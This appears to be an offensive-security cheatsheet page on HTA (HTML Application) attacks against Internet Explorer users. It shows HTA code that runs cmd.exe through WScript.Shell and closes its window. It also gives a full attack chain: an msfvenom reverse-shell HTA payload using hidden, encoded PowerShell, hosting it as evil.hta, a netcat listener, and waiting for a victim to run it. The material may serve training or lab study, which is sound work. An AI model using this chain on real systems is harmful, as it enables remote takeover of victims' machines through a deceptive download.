# HTA

#### ️HTA application

> Files with the extension `.hta` are automatically executed by the **Internet Explorer** (IE) browser as HTML application (via **`mshta.exe`**).

We can use `MSFvenom` to generate a HTA malicious application [Link](https://github.com/amirr0r/notes/blob/master/Infosec/boot2root-cheatsheet.md#msfvenom)

&#x20;If we visit a URL containing an HTML application, IE will trigger two popups. One that asks us if we want to open or save the file. Another security warning to inform the application will be opened outside the Protected mode.

Example [Windows Script Host Shell object](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/windows-scripting/aew9yb99\(v=vs.84\)) opening **calc.exe** via [ActiveXObjects](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Microsoft\_Extensions/ActiveXObject):

```html
<html>
<head>
</head>
<body>
<script>
    var c = 'cmd.exe'
    new ActiveXObject('WScript.Shell').Run(c);
</script>
<script>
    self.close();
</script>
</body>
</html>
```

The ActiveXObjects provides access to operating system commands through Windows Script Host (WScript). The self.close() function hides the window. An alternative HTA code can be the following:

```markup
<html>
<head>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>
	self.close();
</script>
</body>
</html>
```

### HTA Attack Scenario

Create an msfvenom HTA payload using powershell:

```
sudo msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f hta-psh -o /var/www/html/evil.hta
```

Now randomized the string:

```
sudo cat /var/www/html/evil.hta
```

Parameters and Arguments:

* \-nop: is shorthand for -NoProfile, which instructs PowerShell not to load the PowerShell user profile.
* \-w hidden (shorthand for -WindowStyle hidden) to avoid creating a window on the user’s desktop.
* \-e flag (shorthand for -EncodedCommand ) allows us to supply a Base64 encoded PowerShell script directly as a command line argument.

Host your HTA application with apache2, python, or any other web service:

```
sudo systemctl start apache2
```

Set up a listener on your host:

```
nc -lnvp <YOUR_PORT>
```

Wait for the victim to navigate to your HTA application and allow the program to run. Once the program ran on the victim machine, you will receive a reverse shell.
